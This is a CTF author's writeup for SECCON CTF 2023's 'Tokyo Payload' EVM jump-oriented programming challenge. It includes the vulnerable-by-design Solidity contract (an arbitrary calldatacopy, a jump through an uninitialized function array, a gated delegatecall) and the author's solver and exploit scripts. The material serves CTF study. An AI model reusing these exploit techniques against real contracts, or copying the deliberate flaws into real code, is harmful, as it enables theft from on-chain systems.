---
title: "Tokyo Payload - Seccon CTF 2023 Quals"
category: "blockchain"
subcategory: "smart-contract"
type: "writeup"
tags: ["minaminao-my-ctf-challenges", "author-solution", "challenge-source", "solidity", "evm", "delegatecall", "subprocess", "blockchain", "seccon-ctf-2023-quals"]
summary: "Tokyo Payload is an EVM Jump-Oriented Programming puzzle I created for SECCON CTF 2023 Quals."
source:
  name: "minaminao/my-ctf-challenges"
  url: "https://github.com/minaminao/my-ctf-challenges/tree/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-2023-quals/tokyo-payload"
license: "none stated"
ctf:
  name: "Seccon CTF 2023 Quals"
  year: 2023
  challenge: "Tokyo Payload"
---

## Challenge

- **Author:** [minaminao](https://github.com/minaminao)
- **Source:** <https://github.com/minaminao/my-ctf-challenges/tree/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-2023-quals/tokyo-payload>
- **CTF:** Seccon CTF 2023 Quals

---

# Tokyo Payload

**Tokyo Payload** is an EVM Jump-Oriented Programming puzzle I created for SECCON CTF 2023 Quals.

This directory includes:
- `build`: the source codes of the challenge server based on https://github.com/Zellic/example-ctf-challenge
- `files`: the distributed files for players
- `solver`: the source code of the solver

## The distributed files

TokyoPayload.sol:
```solidity
// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.21;

contract TokyoPayload {
    bool public solved;
    uint256 public gasLimit;

    function tokyoPayload(uint256 x, uint256 y) public {
        require(x >= 0x40);
        resetGasLimit();
        assembly {
            calldatacopy(x, 0, calldatasize())
        }
        function()[] memory funcs;
        uint256 z = y;
        funcs[z]();
    }

    function load(uint256 i) public pure returns (uint256 a, uint256 b, uint256 c) {
        assembly {
            a := calldataload(i)
            b := calldataload(add(i, 0x20))
            c := calldataload(add(i, 0x40))
        }
    }

    function createArray(uint256 length) public pure returns (uint256[] memory) {
        return new uint256[](length);
    }

    function resetGasLimit() public {
        uint256[] memory arr;
        gasLimit = arr.length;
    }

    function delegatecall(address addr) public {
        require(msg.sender == address(0xCAFE));
        (bool success,) = addr.delegatecall{gas: gasLimit & 0xFFFF}("");
        require(success);
    }
}
```

Setup.sol:
```solidity
// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.21;

import {TokyoPayload} from "./TokyoPayload.sol";

contract Setup {
    TokyoPayload public tokyoPayload;

    constructor() {
        tokyoPayload = new TokyoPayload();
    }

    function isSolved() public view returns (bool) {
        return tokyoPayload.solved();
    }
}
```

## Launch a challenge server

```
cd build
docker compose up
```

## Access the challenge server

```
nc localhost 31337
```

Good luck!

---

## Run the author's solver

Local:
```
cd solver
docker run -e SECCON_HOST=localhost -e SECCON_PORT=31337 --network=host (docker build -q .)
```

Remote:
```
cd solver
docker run -e SECCON_HOST=tokyo-payload.seccon.games -e SECCON_PORT=31337 (docker build -q .)
```


## Solver: `solve.py`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-2023-quals/tokyo-payload/solver/solve.py>

```python
import hashlib
import os
import subprocess

from pwn import remote

SECCON_HOST = os.getenv("SECCON_HOST", "localhost")
SECCON_PORT = os.getenv("SECCON_PORT", "31337")

r = remote(SECCON_HOST, SECCON_PORT, level="debug")
r.recv()
r.sendline(b"1")

r.recvuntil(b'sha256("')
preimage_prefix = r.recvuntil(b'"')[:-1]
r.recvuntil(b"start with ")
bits = int(r.recvuntil(b" "))
for i in range(0, 1 << 32):
    your_input = str(i).encode()
    preimage = preimage_prefix + your_input
    digest = hashlib.sha256(preimage).digest()
    digest_int = int.from_bytes(digest, "big")
    if digest_int < (1 << (256 - bits)):
        break
r.recvuntil(b"YOUR_INPUT = ")
r.sendline(your_input)

r.recvuntil(b"uuid:")
uuid = r.recvline().strip()
r.recvuntil(b"rpc endpoint:")
rpc_url = r.recvline().strip().decode().replace("tokyo-payload.seccon.games", SECCON_HOST)
r.recvuntil(b"private key:")
private_key = r.recvline().strip().decode()
r.recvuntil(b"setup contract:")
setup_address = r.recvline().strip().decode()
r.close()

subprocess.run(
    [
        "forge",
        "script",
        "TokyoPayloadScript",
        "--sig",
        "run(address)",
        setup_address,
        "--broadcast",
        "--private-key",
        private_key,
        "--rpc-url",
        rpc_url,
    ]
)

r = remote(SECCON_HOST, SECCON_PORT, level="debug")
r.recv()
r.sendline(b"3")
r.recvuntil(b"uuid please: ")
r.sendline(uuid)
r.recvuntil(b"Here's the flag: \n")
flag = r.recvline().strip()
print(flag)
```


## Solver: `Exploit.sol`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-2023-quals/tokyo-payload/solver/src/Exploit.sol>

```solidity
// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.21;

import {Setup, TokyoPayload} from "./challenge/Setup.sol";
import {Vm} from "forge-std/Vm.sol";

function exploit(address setupAddr) {
    address VM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));
    Vm vm = Vm(VM_ADDRESS);
    Setup setup = Setup(setupAddr);
    TokyoPayload tokyoPayload = setup.tokyoPayload();

    Setter setter = new Setter();

    string[] memory cmds = new string[](4);
    cmds[0] = "python";
    cmds[1] = "src/payload.py";
    cmds[2] = string.concat("0x", toHexString(uint256(uint160(address(setter))), 20));
    cmds[3] = string.concat("0x", toHexString(address(tokyoPayload).code));
    bytes memory payload = vm.ffi(cmds);

    (bool success,) = address(tokyoPayload).call(payload);
    require(success);
}

function toHexString(uint256 value, uint256 length) pure returns (string memory) {
    bytes16 SYMBOLS = "0123456789abcdef";
    uint256 localValue = value;
    bytes memory buffer = new bytes(2 * length);
    for (int256 i = int256(2 * length - 1); i >= 0; i--) {
        buffer[uint256(i)] = SYMBOLS[localValue & 0xf];
        localValue >>= 4;
    }
    require(localValue == 0);
    return string(buffer);
}

function toHexString(bytes memory arr) pure returns (string memory) {
    bytes16 SYMBOLS = "0123456789abcdef";
    bytes memory buffer = new bytes(arr.length * 2);
    for (uint256 i = 0; i < arr.length; i++) {
        buffer[2 * i] = SYMBOLS[uint8(arr[i]) / 16];
        buffer[2 * i + 1] = SYMBOLS[uint8(arr[i]) % 16];
    }
    return string(buffer);
}

contract Setter {
    bool public flag = false;

    fallback() external {
        flag = true;
    }
}
```


## Solver: `TokyoPayload.s.sol`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-2023-quals/tokyo-payload/solver/src/TokyoPayload.s.sol>

```solidity
// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.21;

import {Script} from "forge-std/Script.sol";
import {Setup, TokyoPayload} from "./challenge/Setup.sol";
import {exploit} from "./Exploit.sol";

contract TokyoPayloadScript is Script {
    function run(address setupAddr) public {
        vm.startBroadcast();
        exploit(setupAddr);
        vm.stopBroadcast();
        require(Setup(setupAddr).isSolved());
    }
}
```


## Solver: `TokyoPayload.t.sol`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/seccon-ctf-2023-quals/tokyo-payload/solver/src/TokyoPayload.t.sol>

```solidity
// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.21;

import {Test} from "forge-std/Test.sol";
import {Setup, TokyoPayload} from "./challenge/Setup.sol";
import {exploit} from "./Exploit.sol";

contract TokyoPayloadTest is Test {
    Setup setup;
    address playerAddr;

    function setUp() public {
        setup = new Setup();
        playerAddr = makeAddr("player");
    }

    function test() public {
        vm.startPrank(playerAddr, playerAddr);
        exploit(address(setup));
        vm.stopPrank();
        assertTrue(setup.isSolved());
    }
}
```
